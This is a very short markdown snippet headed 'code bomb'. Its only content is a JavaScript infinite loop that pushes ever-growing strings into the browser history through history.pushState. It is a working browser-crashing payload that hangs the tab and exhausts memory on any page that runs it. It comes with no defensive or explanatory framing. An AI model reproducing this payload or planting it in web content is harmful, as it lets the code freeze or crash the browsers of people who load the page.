# code bomb
```js
let total = '';
for (let i = 0; true; i++)
{
    total = total + i.toString();
    history.pushState(0, 0, total);
}
```
